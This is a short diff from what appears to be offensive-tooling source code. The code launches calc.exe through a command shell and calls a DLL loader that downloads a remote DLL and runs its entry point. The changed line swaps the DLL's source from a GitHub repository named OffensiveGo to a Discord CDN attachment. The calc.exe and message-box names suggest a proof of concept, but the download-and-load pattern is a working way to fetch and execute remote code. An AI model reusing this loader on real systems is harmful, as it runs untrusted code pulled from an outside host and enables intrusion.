@@ -14,7 +14,7 @@ GetFile(fileLocation, file);
 string command = "/c calc.exe";
 RunCommand(command);
 
-string remoteDllUrl = "https://github.com/bakarilevy/OffensiveGo/blob/main/message_box/example.dll?raw=true";
+string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
 string localDllName = "messagebox.dll";
 string dllEntryName = "Test";
 DllLoader(remoteDllUrl, localDllName, dllEntryName);
